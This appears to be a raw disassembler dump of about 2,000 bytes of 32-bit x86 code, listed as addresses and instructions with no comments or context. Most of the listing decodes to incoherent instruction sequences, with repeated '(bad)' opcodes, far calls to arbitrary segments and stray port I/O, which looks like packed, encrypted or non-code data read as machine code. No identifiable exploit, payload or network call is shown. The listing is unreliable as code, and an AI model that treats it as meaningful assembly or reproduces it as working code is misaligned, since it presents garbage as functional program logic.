  423748:	sbb    ebx,DWORD PTR [edx+0x39821d19]
  42374e:	mov    ch,0x31
  423750:	push   eax
  423751:	and    DWORD PTR [esi],ebx
  423753:	or     di,WORD PTR fs:[edx-0x180a2204]
  42375b:	inc    esi
  42375c:	mov    ss,ebp
  42375e:	ficomp DWORD PTR [ebp-0x15e4b836]
  423764:	pushf  
  423765:	retf   0x39c3
  423768:	rcr    BYTE PTR [ebx-0x32],0xe3
  42376c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42376d:	stos   DWORD PTR es:[edi],eax
  42376e:	shr    DWORD PTR [ecx+edx*1+0x303fa82e],cl
  423775:	add    DWORD PTR [ecx-0x65],ecx
  423778:	adc    ebp,DWORD PTR [edi+ebp*1+0x7dcef214]
  42377f:	mov    eax,ebx
  423781:	(bad)  
  423782:	nop
  423783:	jo     0x423773
  423785:	bound  ebp,QWORD PTR [ebx-0x4cce0a30]
  42378b:	fnsave [eax]
  42378d:	call   0xda7e:0xb3c962d6
  423794:	enter  0xb82f,0xc6
  423798:	cmp    eax,0xe4aff55d
  42379d:	repz mov ecx,0x59e2642a
  4237a3:	popa   
  4237a4:	mov    BYTE PTR [ecx-0x149f7bd4],bh
  4237aa:	fs mov ch,0x3e
  4237ad:	test   BYTE PTR [ecx],ch
  4237af:	xlat   BYTE PTR ds:[ebx]
  4237b0:	lock mov BYTE PTR [ebx-0x737e1cf0],bl
  4237b7:	pop    ebp
  4237b8:	je     0x4237eb
  4237ba:	pop    edi
  4237bb:	(bad)  
  4237bc:	pop    esp
  4237bd:	inc    esp
  4237be:	leave  
  4237bf:	loope  0x423780
  4237c1:	enter  0x7f83,0x60
  4237c5:	outs   dx,BYTE PTR ds:[esi]
  4237c6:	jae    0x423835
  4237c8:	adc    BYTE PTR [ecx-0x22e3ca4e],bl
  4237ce:	mov    ch,0x3c
  4237d0:	mov    eax,0xc35a5271
  4237d5:	xor    eax,0xf3398e2d
  4237da:	nop
  4237db:	out    dx,eax
  4237dc:	push   esi
  4237dd:	cmp    dh,bl
  4237df:	inc    esi
  4237e0:	mov    dl,0xe0
  4237e2:	inc    edx
  4237e3:	icebp  
  4237e4:	sub    eax,0x54ef278e
  4237e9:	xchg   ecx,eax
  4237ea:	add    eax,0x2dac94b
  4237ef:	movsx  ebx,bx
  4237f2:	aaa    
  4237f3:	xchg   ebp,eax
  4237f4:	out    0xb3,eax
  4237f6:	mov    bh,0x50
  4237f8:	lods   eax,DWORD PTR ds:[esi]
  4237f9:	cmp    ecx,ebx
  4237fb:	retf   0x551d
  4237fe:	rcr    BYTE PTR [ebx+0x492b8bd],0xb9
  423805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423806:	inc    ebx
  423807:	mov    ?,WORD PTR ds:0xf6c908c
  42380d:	in     eax,0xc8
  42380f:	mov    WORD PTR [ecx+edx*2-0x275f7071],gs
  423816:	pop    edx
  423817:	push   ecx
  423818:	and    eax,0x40851a7e
  42381d:	rol    DWORD PTR [ebx],0x8c
  423820:	push   edi
  423821:	pop    ds
  423822:	out    dx,al
  423823:	add    cl,BYTE PTR [ecx+0x42db890f]
  423829:	inc    edx
  42382a:	and    al,0xec
  42382c:	mov    eax,ds:0x6dda16ce
  423831:	bound  ebx,QWORD PTR [edi]
  423833:	mov    edx,0x5d48f567
  423838:	pop    edx
  423839:	jns    0x423823
  42383b:	jns    0x42380d
  42383d:	mov    dh,0x16
  42383f:	pop    eax
  423840:	pop    ds
  423841:	cmpxchg BYTE PTR [edi+0x1c9ea4bc],al
  423848:	xchg   edi,eax
  423849:	ror    DWORD PTR [eax],0x83
  42384c:	outs   dx,DWORD PTR ds:[esi]
  42384d:	and    DWORD PTR [edi],eax
  42384f:	(bad)  
  423850:	xor    eax,ecx
  423852:	retf   
  423853:	xchg   edx,eax
  423854:	pop    ebx
  423855:	xchg   ecx,eax
  423856:	push   ebp
  423857:	js     0x4237ea
  423859:	push   ebp
  42385a:	jl     0x42386a
  42385c:	add    DWORD PTR [edx],eax
  42385e:	in     eax,dx
  42385f:	std    
  423860:	adc    al,0x1b
  423862:	loopne 0x4238d5
  423864:	lock sbb edi,DWORD PTR [edx]
  423867:	popa   
  423868:	cli    
  423869:	sar    DWORD PTR fs:[ecx+0x197d44e7],0x27
  423871:	mov    ah,0xb
  423873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423876:	into   
  423877:	test   al,0xbd
  423879:	das    
  42387a:	mov    bh,0x35
  42387c:	(bad)
  423880:	add    eax,DWORD PTR [ebp-0x3b]
  423883:	jno    0x423830
  423885:	jnp    0x423823
  423887:	es cwde 
  423889:	inc    edi
  42388a:	popa   
  42388b:	and    eax,0x87b8fcfe
  423890:	sbb    BYTE PTR [esi+0x1],ah
  423893:	shr    eax,1
  423895:	pop    ds
  423896:	outs   dx,BYTE PTR ds:[esi]
  423897:	add    ch,bh
  423899:	xor    esp,edi
  42389b:	mov    edx,0xea21ce57
  4238a0:	rcr    BYTE PTR ds:0xc3c22b93,0x7
  4238a7:	add    al,0x9a
  4238a9:	test   eax,0xa5ceb86c
  4238ae:	push   eax
  4238af:	push   edx
  4238b0:	test   BYTE PTR [esi-0x273b369d],dl
  4238b6:	mov    eax,ds:0xb778ae6e
  4238bb:	fsubr  DWORD PTR [ecx]
  4238bd:	jmp    0x42386d
  4238bf:	(bad)  
  4238c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238c1:	cmp    ch,dl
  4238c3:	into   
  4238c4:	mov    ch,0x7d
  4238c7:	iret   
  4238c8:	or     ebx,edx
  4238ca:	jecxz  0x4238c4
  4238cc:	cmp    eax,0x368da062
  4238d1:	fisub  DWORD PTR [ebp-0x2b09be47]
  4238d7:	sub    BYTE PTR [eax-0x33be8102],ch
  4238dd:	(bad)  
  4238de:	ficom  WORD PTR [ecx+0x5441714e]
  4238e4:	fcom   DWORD PTR [edx+0x56]
  4238e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238e8:	jae    0x4238ca
  4238ea:	or     eax,0x52c6e4
	...
  4238f7:	add    BYTE PTR [eax],al
  4238f9:	add    ch,bl
  4238fb:	cmp    al,0x8f
  4238fd:	mov    esp,0x7dffbfef
  423902:	in     al,dx
  423903:	outs   dx,BYTE PTR ds:[esi]
  423904:	fs push esp
  423906:	sar    DWORD PTR [esi+edi*1+0x1],0xa8
  42390b:	mov    dl,0x1
  42390d:	add    ah,bh
  42390f:	add    DWORD PTR [eax],eax
  423911:	add    BYTE PTR [eax],bl
  423913:	add    bl,bh
  423915:	mov    ?,WORD PTR [eax+0x1d]
  423918:	dec    edx
  423919:	cli    
  42391a:	fs mov ebx,0x81e731ea
  423920:	fdivr  QWORD PTR [esi+ecx*2]
  423923:	pop    edi
  423924:	xchg   esi,eax
  423925:	push   ebx
  423926:	sar    BYTE PTR [esi-0x44ece0e9],0x39
  42392d:	dec    ecx
  42392e:	adc    ch,BYTE PTR [edi+0x2724f584]
  423934:	push   esi
  423935:	add    BYTE PTR [esi+0x4e02388f],ch
  42393b:	pop    eax
  42393c:	retf   0x5ed
  42393f:	scas   al,BYTE PTR es:[edi]
  423940:	into   
  423941:	or     bh,BYTE PTR [esi+0x726c93c6]
  423947:	jno    0x4238cd
  423949:	sbb    BYTE PTR [ecx-0x4b],ch
  42394c:	pusha  
  42394d:	rol    BYTE PTR [eax-0x53],1
  423950:	iret   
  423951:	pop    ds
  423952:	xchg   esi,eax
  423953:	mov    dl,0x40
  423955:	push   esp
  423956:	fucomp st(6)
  423958:	push   ebx
  423959:	lahf   
  42395a:	enter  0x59c,0xd1
  42395e:	ret    
  42395f:	inc    cl
  423961:	call   0xb6d9:0x36e6724f
  423968:	call   0x3f802c0a
  42396d:	pop    esp
  42396e:	arpl   WORD PTR [eax],dx
  423970:	xchg   DWORD PTR [eax+0x40b2d0df],ebp
  423976:	test   al,0xe6
  423978:	cmp    BYTE PTR [edi],ah
  42397a:	pop    eax
  42397b:	stos   DWORD PTR es:[edi],eax
  42397c:	jb     0x423982
  42397e:	sub    bl,BYTE PTR [eax]
  423980:	dec    esi
  423981:	xchg   bh,al
  423983:	xor    ecx,ebx
  423985:	or     DWORD PTR [esi+ecx*8+0x3bbd1c4f],ecx
  42398c:	pusha  
  42398d:	dec    eax
  42398e:	sahf   
  42398f:	ins    BYTE PTR es:[edi],dx
  423990:	lods   al,BYTE PTR ds:[esi]
  423991:	addr16 pusha 
  423993:	mov    bl,0xb1
  423995:	ficom  DWORD PTR [esi+0x2b5352]
  42399b:	ja     0x4239a9
  42399d:	std    
  42399e:	fadd   QWORD PTR [eax]
  4239a0:	mov    ds:0x48ef9cb,al
  4239a5:	in     eax,0x80
  4239a7:	in     eax,0xd7
  4239a9:	jl     0x423969
  4239ab:	xchg   edx,eax
  4239ac:	sub    BYTE PTR [ebx+0x3ef3f28c],ch
  4239b2:	int3   
  4239b3:	lods   eax,DWORD PTR ds:[esi]
  4239b4:	pop    edi
  4239b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239b6:	adc    esp,DWORD PTR [ebp-0x55]
  4239b9:	out    dx,al
  4239ba:	or     edx,DWORD PTR [ebx-0x68]
  4239bd:	sub    BYTE PTR [ebp+0xc],ch
  4239c0:	sbb    DWORD PTR [edx-0x2d3fba76],eax
  4239c6:	pop    edi
  4239c7:	scas   eax,DWORD PTR es:[edi]
  4239c8:	mov    edx,es
  4239ca:	ins    DWORD PTR es:[edi],dx
  4239cb:	lds    edx,FWORD PTR ds:0xd56f6a9c
  4239d1:	scas   al,BYTE PTR es:[edi]
  4239d2:	inc    edx
  4239d3:	mov    al,ds:0xa57cbff1
  4239d8:	mov    esi,0x1bdf2ea2
  4239dd:	xlat   BYTE PTR ds:[ebx]
  4239de:	es xchg ebp,eax
  4239e0:	dec    edi
  4239e1:	sbb    DWORD PTR [edx-0x114d2e37],esi
  4239e7:	or     eax,0xa2fc9ca3
  4239ec:	sub    cl,BYTE PTR [edx]
  4239ee:	scas   al,BYTE PTR es:[edi]
  4239ef:	sbb    al,0x20
  4239f1:	xor    al,0x1d
  4239f3:	xchg   DWORD PTR [ebp-0x71],esp
  4239f6:	sub    BYTE PTR [eax+0x69721bab],bh
  4239fc:	addr16 xor ebp,eax
  4239ff:	or     edx,DWORD PTR [esi+0x2d]
  423a02:	aaa    
  423a03:	sub    BYTE PTR [esp+ebx*1+0x40],0xd1
  423a08:	adc    al,0xd9
  423a0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a0b:	(bad)  
  423a0d:	sbb    al,0x3
  423a0f:	jnp    0x423993
  423a11:	xchg   ecx,eax
  423a12:	mov    edx,0x8aa71a92
  423a17:	jecxz  0x423a70
  423a19:	sbb    bh,ah
  423a1b:	push   ds
  423a1c:	push   0xffffffcc
  423a1e:	(bad)  
  423a1f:	push   esi
  423a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a21:	or     BYTE PTR [ecx-0x6f],dh
  423a24:	push   DWORD PTR [edi+0x1]
  423a27:	bound  edx,QWORD PTR [ebx-0x5e]
  423a2a:	ja     0x423a18
  423a2c:	inc    esi
  423a2d:	or     ebp,DWORD PTR [edx-0x9]
  423a30:	idiv   ebx
  423a32:	add    DWORD PTR [ebp+0x59],edx
  423a35:	xor    al,0x2a
  423a37:	sbb    BYTE PTR [edx+0x4c],0xdc
  423a3b:	adc    eax,0xba495b5d
  423a40:	lods   al,BYTE PTR ds:[esi]
  423a41:	ins    BYTE PTR es:[edi],dx
  423a42:	clc    
  423a43:	inc    esp
  423a44:	clc    
  423a45:	jne    0x423a87
  423a47:	loopne 0x423a28
  423a49:	(bad)  
  423a4b:	inc    esp
  423a4c:	mov    gs,WORD PTR [esi+ebx*4-0x31ed553]
  423a53:	addr16 mov ah,0xc0
  423a56:	and    al,0x14
  423a58:	and    DWORD PTR [ebx-0x79],esp
  423a5b:	cli    
  423a5c:	xor    al,0xa
  423a5e:	jl     0x423a16
  423a60:	(bad)  
  423a61:	js     0x423abd
  423a63:	jbe    0x423ac0
  423a65:	mov    ah,0x96
  423a67:	cwde   
  423a68:	fstp   QWORD PTR [ecx-0x32]
  423a6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a6c:	jbe    0x423aa4
  423a6e:	xor    al,0xc
  423a70:	retf   
  423a71:	jp     0x423a69
  423a73:	inc    edx
  423a74:	into   
  423a75:	inc    esp
  423a76:	and    al,0xf7
  423a78:	xchg   ebx,eax
  423a79:	inc    edx
  423a7a:	les    edx,FWORD PTR [esi-0x59b32e1f]
  423a80:	out    dx,eax
  423a81:	add    eax,0x5e72f0c8
  423a86:	hlt    
  423a87:	retf   0x3a2a
  423a8a:	jne    0x423a23
  423a8c:	push   eax
  423a8d:	or     al,0xb
  423a8f:	inc    ecx
  423a90:	pop    eax
  423a91:	loop   0x423a51
  423a93:	mov    eax,ss:0x7d6a5f99
  423a99:	popf   
  423a9a:	repnz aad 0xc5
  423a9d:	or     BYTE PTR [esi+eiz*1+0x37],al
  423aa1:	sub    al,0x15
  423aa3:	jg     0x423ac0
  423aa5:	push   DWORD PTR [ebx-0x65]
  423aa8:	ds (bad) 
  423aaa:	fcmovnbe st,st(4)
  423aac:	shl    esi,0xe5
  423aaf:	mov    BYTE PTR [ebx],bl
  423ab1:	dec    esi
  423ab2:	mov    ah,0x41
  423ab4:	ja     0x423a92
  423ab6:	inc    ebp
  423ab7:	mov    ecx,0x7cc49f45
  423abc:	and    esi,DWORD PTR [edx+ebp*8+0x31abbfd6]
  423ac3:	sti    
  423ac4:	and    esi,edx
  423ac6:	imul   esp,DWORD PTR gs:[edx+0x60],0x2a425abd
  423ace:	mov    eax,ds:0x441a669c
  423ad3:	hlt    
  423ad4:	jmp    0x4013:0xbf15db8
  423adb:	inc    ebx
  423adc:	(bad)  
  423add:	shr    BYTE PTR [edx-0x2e90aaad],1
  423ae3:	and    ebp,0x5
  423ae6:	aad    0x65
  423ae8:	scas   eax,DWORD PTR es:[edi]
  423ae9:	dec    DWORD PTR [ebx]
  423aeb:	add    al,0x47
  423aed:	mov    bh,BYTE PTR [edx+0x33]
  423af0:	adc    eax,0x8037ac2d
  423af5:	ficom  WORD PTR [edx+0x4ebad215]
  423afb:	inc    edx
  423afc:	sti    
  423afd:	enter  0x304f,0x84
  423b01:	xor    eax,0xa95f6929
  423b06:	cmp    ch,BYTE PTR [edx+0x70]
  423b09:	sbb    BYTE PTR [ecx],0x8c
  423b0c:	into   
  423b0d:	fild   WORD PTR [eax]
	...
  423b17:	add    BYTE PTR [eax],al
  423b19:	add    BYTE PTR [esi-0x4fd6421],dh
  423b1f:	inc    esi
  423b20:	mov    edi,0x261aff
  423b25:	jb     0x423b54
  423b27:	popf   
  423b28:	add    al,0x7f
  423b2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b2b:	mov    ah,0x1
  423b2d:	add    ah,bh
  423b2f:	add    DWORD PTR [eax],eax
  423b31:	add    BYTE PTR [edx+0x74],bh
  423b34:	cmp    ch,dl
  423b36:	push   ds
  423b37:	push   esp
  423b38:	pop    esp
  423b39:	out    dx,eax
  423b3a:	add    al,0xd
  423b3c:	daa    
  423b3d:	call   0x2c9fbda8
  423b42:	mov    dh,0x93
  423b44:	pop    ecx
  423b45:	xchg   DWORD PTR [esi],ebp
  423b47:	mov    DWORD PTR [ebx-0x5b],eax
  423b4a:	or     DWORD PTR [ebx+0xf],ebx
  423b4d:	scas   eax,DWORD PTR es:[edi]
  423b4e:	js     0x423b12
  423b50:	nop
  423b51:	xchg   edx,eax
  423b52:	mov    ch,0x39
  423b54:	mov    ebp,0x1353d628
  423b59:	jmp    0x423bb7
  423b5b:	ret    
  423b5c:	mov    esp,0x1494c57f
  423b61:	add    BYTE PTR [edx],bl
  423b63:	daa    
  423b64:	inc    edx
  423b65:	push   0xffffffad
  423b67:	sbb    DWORD PTR [ebx],ecx
  423b69:	push   es
  423b6a:	lea    ebp,[esi-0x25]
  423b6d:	stos   BYTE PTR es:[edi],al
  423b6e:	sbb    eax,0xe2687248
  423b73:	lock mov ebx,0x40b7bc2
  423b79:	test   esi,ecx
  423b7b:	(bad)  
  423b7c:	stos   DWORD PTR es:[edi],eax
  423b7d:	gs cmp al,0xe5
  423b80:	mov    ecx,0xd4048852
  423b85:	jb     0x423b2d
  423b87:	cli    
  423b88:	pop    esp
  423b89:	aas    
  423b8a:	out    dx,eax
  423b8b:	stos   BYTE PTR es:[edi],al
  423b8c:	xchg   ecx,eax
  423b8d:	dec    ebp
  423b8e:	retf   
  423b8f:	jns    0x423bd2
  423b91:	jecxz  0x423bcf
  423b93:	fcomip st,st(7)
  423b95:	push   esi
  423b96:	xchg   edx,edx
  423b98:	sub    ecx,DWORD PTR [edi]
  423b9a:	cmc    
  423b9b:	or     al,0x20
  423b9d:	mov    ds:0x8cb2858c,eax
  423ba2:	jp     0x423c12
  423ba4:	and    dl,BYTE PTR [esp+ebx*8+0x58c77abe]
  423bab:	nop
  423bac:	cmp    eax,0xd02a9013
  423bb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423bb2:	inc    ecx
  423bb3:	xlat   BYTE PTR ds:[ebx]
  423bb4:	and    al,0x60
  423bb6:	mov    edi,0xddda6b56
  423bbb:	fimul  DWORD PTR [edi-0xc]
  423bbe:	adc    eax,edx
  423bc0:	mov    WORD PTR [ecx+ebp*8],cs
  423bc3:	mov    dl,0xa6
  423bc5:	add    ebx,DWORD PTR ss:[ebx]
  423bc8:	mov    ds:0x91b0c060,eax
  423bcd:	sub    bl,BYTE PTR [ecx]
  423bcf:	out    dx,al
  423bd0:	les    eax,FWORD PTR [edx+0x3a]
  423bd3:	fnstsw WORD PTR ds:0xd416c3a2
  423bd9:	imul   esp,DWORD PTR [eax-0x27],0x92c591c0
  423be0:	jnp    0x423b6e
  423be2:	arpl   WORD PTR [esi+0x4a],sp
  423be5:	and    BYTE PTR [eax],dl
  423be7:	mov    esp,0x66f7ca60
  423bec:	push   es
  423bed:	cmp    eax,0xdb627b38
  423bf2:	push   es
  423bf3:	imul   edx,edx,0xffffffb3
  423bf6:	xor    eax,0x982a173f
  423bfb:	sub    edi,DWORD PTR [ecx]
  423bfd:	mov    esi,0xd6e1530d
  423c02:	sub    cl,BYTE PTR [ebp+0x589af2fe]
  423c08:	inc    edx
  423c09:	dec    esi
  423c0a:	adc    al,0xb1
  423c0c:	fucom  st(6)
  423c0e:	jmp    0x7805:0xc135e6a3
  423c15:	shl    BYTE PTR [ebp+0x78db7ba1],cl
  423c1b:	xor    BYTE PTR [esi-0x64ac9c86],0xc2
  423c22:	mov    esp,0xd4df77de
  423c27:	das    
  423c28:	mov    ebp,0x5bad76e1
  423c2d:	mov    esp,0xb136d61a
  423c32:	pop    esp
  423c33:	add    ah,bl
  423c35:	into   
  423c36:	repz xchg ebx,eax
  423c38:	arpl   WORD PTR [eax+0x64],dx
  423c3b:	add    ecx,ebx
  423c3d:	hlt    
  423c3e:	pop    esi
  423c3f:	pop    es
  423c40:	mov    edx,0x8270a485
  423c45:	sbb    eax,0x7c016165
  423c4a:	scas   eax,DWORD PTR es:[edi]
  423c4b:	push   ss
  423c4c:	dec    ebx
  423c4d:	das    
  423c4e:	jp     0x423ccb
  423c50:	xchg   ebp,eax
  423c51:	(bad)  
  423c52:	mov    edx,0x7092dfda
  423c57:	push   ecx
  423c58:	(bad)  
  423c59:	and    ebp,eax
  423c5b:	dec    edx
  423c5c:	cli    
  423c5d:	into   
  423c5e:	jl     0x423c82
  423c60:	pop    ecx
  423c61:	xchg   DWORD PTR [esp+0x4],edi
  423c65:	push   ss
  423c66:	dec    ebp
  423c67:	lea    eax,[ebp+0x1e]
  423c6a:	pop    eax
  423c6b:	cmp    al,0xb
  423c6d:	leave  
  423c6e:	dec    eax
  423c6f:	fsubrp st(0),st
  423c71:	lahf   
  423c72:	je     0x423c0a
  423c74:	stos   BYTE PTR es:[edi],al
  423c75:	rcl    DWORD PTR [eax+0x1df6b7db],cl
  423c7b:	(bad)  
  423c7c:	ins    DWORD PTR es:[edi],dx
  423c7d:	repz pop ebp
  423c7f:	hlt    
  423c80:	call   0x507e2639
  423c85:	xchg   edi,eax
  423c86:	jae    0x423caa
  423c88:	mov    ch,0x91
  423c8a:	xchg   ecx,eax
  423c8b:	data16 data16 mov dh,0x32
  423c8f:	xor    eax,DWORD PTR [edi]
  423c91:	jmp    0x423c76
  423c93:	popa   
  423c94:	pop    ss
  423c95:	in     eax,0xe3
  423c97:	test   BYTE PTR [esi+0x30],ch
  423c9a:	xor    DWORD PTR ds:0xa91cbc07,ebp
  423ca0:	fistp  WORD PTR [edi-0x48]
  423ca3:	jl     0x423cda
  423ca5:	(bad)  
  423ca6:	hlt    
  423ca7:	cmp    BYTE PTR [esi],al
  423ca9:	mov    dl,0x9e
  423cab:	mov    ch,BYTE PTR [eax]
  423cad:	lea    ecx,[edi+0xa5f6864]
  423cb3:	xor    DWORD PTR [eax],0xec1a4e83
  423cb9:	(bad)  
  423cbb:	(bad)  
  423cbc:	das    
  423cbd:	and    eax,0xd4a9dc0
  423cc2:	fdivr  QWORD PTR [edi+0x1e]
  423cc5:	ret    
  423cc6:	mov    bh,0xeb
  423cc8:	mov    ebx,0xa529e907
  423ccd:	xor    ch,dh
  423ccf:	imul   edi,DWORD PTR cs:[edx],0xfffffff7
  423cd3:	ror    DWORD PTR [ebp+edx*8+0x31],cl
  423cd7:	aas    
  423cd8:	data16 arpl WORD PTR [ecx-0x2b],cx
  423cdc:	ja     0x423cbe
  423cde:	inc    edx
  423cdf:	pop    ebx
  423ce0:	arpl   WORD PTR [ecx+ecx*8-0x41],bx
  423ce4:	shr    DWORD PTR [esi+0x1abce20],1
  423cea:	push   edi
  423ceb:	lahf   
  423cec:	dec    eax
  423cee:	aad    0x31
  423cf0:	not    BYTE PTR [ecx-0x110f7e76]
  423cf6:	inc    ebx
  423cf7:	xchg   esi,eax
  423cf8:	cs sub eax,0xad007ed4
  423cfe:	jle    0x423d3c
  423d00:	aaa    
  423d01:	xchg   DWORD PTR [ebp+0x1394cf2e],edi
  423d07:	lock mov eax,0x75af2c70
  423d0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d0e:	rcl    BYTE PTR [edi+ebp*2-0x3e],0x68
  423d13:	cmp    BYTE PTR [ebx-0x2aade3f0],bl
  423d19:	pushf  
  423d1a:	out    dx,al
  423d1b:	mov    bl,BYTE PTR ds:0x301fc313
  423d21:	call   0x8540:0xe52d1433
  423d28:	div    DWORD PTR [esi+eax*4]
  423d2b:	jle    0x423cd4
  423d2d:	jmp    0x423d2f
	...
  423d37:	add    BYTE PTR [eax],al
  423d39:	add    al,bh
  423d3b:	mov    ah,0x7f
  423d3d:	cmp    eax,0xf5faff7f
  423d42:	mov    edx,0x4057ffb2
  423d47:	jnp    0x423ce5
  423d49:	jl     0x423ceb
  423d4b:	mov    dh,0x1
  423d4d:	add    ah,bh
  423d4f:	add    DWORD PTR [eax],eax
  423d51:	add    dh,bh
  423d53:	dec    esp
  423d54:	dec    eax
  423d55:	cmp    dl,ch
  423d57:	pop    eax
  423d58:	pop    es
  423d59:	sub    BYTE PTR [eax],bl
  423d5b:	push   edi
  423d5c:	repz in eax,0x41
  423d5f:	xchg   ebx,eax
  423d60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d61:	jns    0x423d83
  423d63:	push   esi
  423d64:	and    ah,dh
  423d66:	imul   esi,esi,0xffffff8b
  423d69:	adc    eax,0x5a7b6ba9
  423d6e:	psubsw mm0,QWORD PTR [ebx+0x4f]
  423d72:	popa   
  423d73:	dec    edi
  423d74:	shl    DWORD PTR [eax],0x2f
  423d77:	or     eax,0xa3778582
  423d7c:	xor    al,0x51
  423d7e:	mov    ah,0xf9
  423d80:	and    ah,BYTE PTR [ebx]
  423d82:	cli    
  423d83:	pop    ebx
  423d84:	cdq    
  423d85:	pop    ecx
  423d86:	test   edx,esp
  423d88:	fwait
  423d89:	pop    ebx
  423d8a:	sub    eax,0x64cafab0
  423d8f:	mov    dh,0xd5
  423d91:	test   BYTE PTR [ecx],0xf2
  423d94:	pop    edx
  423d95:	sub    al,0xf8
  423d97:	aaa    
  423d98:	pusha  
  423d99:	test   al,0x8
  423d9b:	ja     0x423dba
  423d9d:	test   BYTE PTR [ecx],dl
  423d9f:	sub    al,0xe1
  423da1:	(bad)  
  423da2:	mov    esp,0x28dc6e41
  423da7:	aam    0x1d
  423da9:	outs   dx,BYTE PTR ds:[esi]
  423daa:	adc    eax,0xf9da7532
  423daf:	sbb    esi,DWORD PTR [ecx+0x6e1b4b01]
  423db5:	xor    al,0x26
  423db7:	mov    edx,0xe7539ad
  423dbc:	inc    edi
  423dbd:	inc    eax
  423dbe:	sti    
  423dbf:	sahf   
  423dc0:	shr    DWORD PTR [ebp-0x29e918a9],0xe5
  423dc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423dc8:	out    dx,eax
  423dc9:	add    DWORD PTR [ebx+0x2a],esp
  423dcc:	ret    0x3c61
  423dcf:	xchg   DWORD PTR [eax-0x7a3b8b33],esi
  423dd5:	sub    eax,0xcd63e083
  423dda:	popf   
  423ddb:	data16 in al,0x76
  423dde:	sub    BYTE PTR [ecx+0x37],dl
  423de1:	push   ebx
  423de2:	sub    ebx,edx
  423de4:	cs loopne 0x423e42
  423de7:	xchg   esp,eax
  423de8:	adc    BYTE PTR [eax-0x55],bh
  423deb:	aam    0x52
  423ded:	dec    esp
  423dee:	test   eax,0x7c658180
  423df3:	outs   dx,DWORD PTR ds:[esi]
  423df4:	jnp    0x423dd0
  423df6:	mov    ch,0xed
  423df8:	and    al,0x18
  423dfa:	gs jnp 0x423e76
  423dfd:	dec    ecx
  423dfe:	sub    DWORD PTR [ebx],esp
  423e00:	enter  0x3ca1,0x7e
  423e04:	hlt    
  423e05:	addr16 in al,0xda
  423e08:	adc    BYTE PTR gs:[edi-0x24],0x45
  423e0d:	jnp    0x423dba
  423e0f:	fst    st(3)
  423e11:	mov    ds:0x50c4a015,eax
  423e16:	fs in  eax,dx
  423e18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e19:	mov    bh,0x88
  423e1b:	inc    edi
  423e1c:	clc    
  423e1d:	xor    ah,BYTE PTR [edx-0x27]
  423e20:	adc    DWORD PTR [eax],ebx
  423e22:	add    al,0xc6
  423e24:	pop    es
  423e25:	inc    esp
  423e26:	xor    eax,0xb6b87e6
  423e2b:	fdiv   DWORD PTR [edi]
  423e2d:	mov    cl,0x80
  423e2f:	jp     0x423de3
  423e31:	and    DWORD PTR [ecx],esi
  423e33:	or     al,0x38
  423e35:	mov    ebx,0x4014c5de
  423e3a:	retf   
  423e3b:	mov    bh,0x87
  423e3d:	push   ss
  423e3e:	enter  0xdf9f,0xbd
  423e42:	inc    cl
  423e44:	inc    ebx
  423e45:	or     eax,0xc260d541
  423e4a:	dec    ebx
  423e4b:	add    ebx,ecx
  423e4d:	aam    0x2
  423e4f:	mov    WORD PTR [ecx],?
  423e51:	mov    eax,0x6be6a58b
  423e56:	fisubr WORD PTR ds:0x4e4c643c
  423e5c:	rol    DWORD PTR [eax],1
  423e5e:	push   cs
  423e5f:	add    BYTE PTR [ebx+edx*2-0x31],cl
  423e63:	mov    ds:0x6dca52ba,al
  423e68:	sub    dl,BYTE PTR [ebp+edi*8-0x10ce78a9]
  423e6f:	mov    cl,0x39
  423e71:	lock or al,0x73
  423e74:	adc    DWORD PTR [edi+0x5a],0xa48dee6c
  423e7b:	jg     0x423e75
  423e7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e7e:	test   DWORD PTR [ebx-0x6b6bfcfb],esi
  423e84:	cmp    BYTE PTR [edi+0x65a41a69],cl
  423e8a:	ret    
  423e8b:	mov    bh,BYTE PTR ds:0x93ed9ee
  423e91:	hlt    
  423e92:	lods   eax,DWORD PTR ds:[esi]
  423e93:	cmc    
  423e94:	or     eax,0x5fda0657
  423e99:	cmp    eax,0xc9485699
  423e9e:	fisub  DWORD PTR [ecx+0x21]
  423ea1:	mov    al,ds:0xcf401c0c
  423ea6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ea7:	popf   
  423ea8:	gs aad 0xa
  423eab:	or     cl,ah
  423ead:	pushf  
  423eae:	ret    0xfd33
  423eb1:	jp     0x423e81
  423eb3:	aam    0xa
  423eb5:	call   0xc141e0b9
  423eba:	mov    al,ds:0xe15e0c3a
  423ebf:	xor    ebx,edi
  423ec1:	xchg   edx,eax
  423ec2:	mov    DWORD PTR [esi],0xcc69bd72
  423ec8:	jbe    0x423ef6
  423eca:	add    dl,0x17
  423ecd:	out    0x5a,al
  423ecf:	fisubr WORD PTR [ebx+0x31]
  423ed2:	xor    bl,BYTE PTR [ebx]
  423ed4:	in     al,0xef
  423ed6:	and    DWORD PTR [esi+0x13],ecx
  423ed9:	cmp    al,0xf1
  423edb:	sub    BYTE PTR [edx+0x7b],cl
  423ede:	cld    
  423edf:	int    0x7a
  423ee1:	xor    al,0x93
  423ee3:	sbb    dl,BYTE PTR [ecx]
  423ee5:	fst    QWORD PTR [edx]
  423ee7:	xor    dl,dh
  423ee9:	sub    edi,DWORD PTR [ecx+0x14]
  423eec:	jecxz  0x423ef1
  423eee:	sbb    ah,BYTE PTR [esi]
  423ef0:	rol    al,0x50
  423ef3:	and    eax,0x7cf1c788
  423ef8:	inc    ebp
  423ef9:	xchg   edi,eax
  423efa:	pop    edx
  423efb:	mov    esp,0xd1acdcf5
